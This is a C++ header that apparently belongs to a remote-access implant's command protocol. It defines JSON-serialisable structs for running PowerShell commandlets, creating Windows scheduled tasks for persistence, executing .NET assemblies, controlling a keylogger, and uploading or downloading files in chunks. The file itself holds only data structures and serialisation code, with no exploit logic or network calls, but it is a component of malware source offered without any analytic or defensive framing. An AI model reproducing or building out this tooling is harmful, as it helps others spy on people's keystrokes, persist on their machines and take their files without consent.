//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

#pragma once

#include <string>
#include <rapidjson/document.h>
#include <rapidjson/stringbuffer.h>
#include <rapidjson/writer.h>
#include <cstdint>

struct CommandPowershell
{
    std::string commandlet;
    std::string arguements;

    rapidjson::Value ToJsonValue(
        rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value obj(rapidjson::kObjectType);

        rapidjson::Value cmdVal;
        cmdVal.SetString(
            commandlet.c_str(),
            static_cast<rapidjson::SizeType>(commandlet.length()),
            allocator);

        rapidjson::Value argsVal;
        argsVal.SetString(
            arguements.c_str(),
            static_cast<rapidjson::SizeType>(arguements.length()),
            allocator);

        obj.AddMember("Commandlet", cmdVal, allocator);
        obj.AddMember("Arguements", argsVal, allocator);

        return obj;
    }
};

struct KeyloggerState
{
    bool isRunning;
    std::string data;
};

struct CommandWinTask
{
    std::string path;
    std::string username;
    std::string taskName;

    rapidjson::Value ToJsonValue(
        rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value obj(rapidjson::kObjectType);

        rapidjson::Value pathVal;
        pathVal.SetString(
            path.c_str(),
            static_cast<rapidjson::SizeType>(path.length()),
            allocator);

        rapidjson::Value usernameVal;
        usernameVal.SetString(
            username.c_str(),
            static_cast<rapidjson::SizeType>(username.length()),
            allocator);

        rapidjson::Value taskNameVal;
        taskNameVal.SetString(
            taskName.c_str(),
            static_cast<rapidjson::SizeType>(taskName.length()),
            allocator);

        obj.AddMember("Path", pathVal, allocator);
        obj.AddMember("Username", usernameVal, allocator);
        obj.AddMember("TaskName", taskNameVal, allocator);

        return obj;
    }
};

struct CommandNetAsm
{
    std::string args;
    std::string assembly;

    rapidjson::Value ToJsonValue(
        rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value obj(rapidjson::kObjectType);

        rapidjson::Value argsVal;
        argsVal.SetString(
            args.c_str(),
            static_cast<rapidjson::SizeType>(args.length()),
            allocator);

        rapidjson::Value assemblyVal;
        assemblyVal.SetString(
            assembly.c_str(),
            static_cast<rapidjson::SizeType>(assembly.length()),
            allocator);

        obj.AddMember("Args", argsVal, allocator);
        obj.AddMember("Assembly", assemblyVal, allocator);

        return obj;
    }
};

struct CommandKeylogger
{
    rapidjson::Value ToJsonValue(
        rapidjson::Document::AllocatorType &allocator) const
    {
        return rapidjson::Value(rapidjson::kObjectType);
    }
};

// File structs
struct CommandUploadFile
{
    std::string path;
    std::int64_t offset;

    rapidjson::Value ToJsonValue(
        rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value obj(rapidjson::kObjectType);

        rapidjson::Value pathVal;
        pathVal.SetString(
            path.c_str(),
            static_cast<rapidjson::SizeType>(path.length()),
            allocator);

        obj.AddMember("Path", pathVal, allocator);
        obj.AddMember("Offset", offset, allocator);

        return obj;
    }
};

struct CommandDownloadFile
{
    std::string path;
    std::string destinationPath;
    std::string data;
    std::int64_t offset;
    bool final;

    rapidjson::Value ToJsonValue(
        rapidjson::Document::AllocatorType &allocator) const
    {
        rapidjson::Value obj(rapidjson::kObjectType);

        rapidjson::Value pathVal;
        pathVal.SetString(
            path.c_str(),
            static_cast<rapidjson::SizeType>(path.length()),
            allocator);

        rapidjson::Value destinationPathVal;
        destinationPathVal.SetString(
            destinationPath.c_str(),
            static_cast<rapidjson::SizeType>(destinationPath.length()),
            allocator);

        rapidjson::Value dataVal;
        dataVal.SetString(
            data.c_str(),
            static_cast<rapidjson::SizeType>(data.length()),
            allocator);

        obj.AddMember("Path", pathVal, allocator);
        obj.AddMember("DestinationPath", destinationPathVal, allocator);
        obj.AddMember("Data", dataVal, allocator);
        obj.AddMember("Offset", offset, allocator);
        obj.AddMember("Final", final, allocator);

        return obj;
    }
};

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//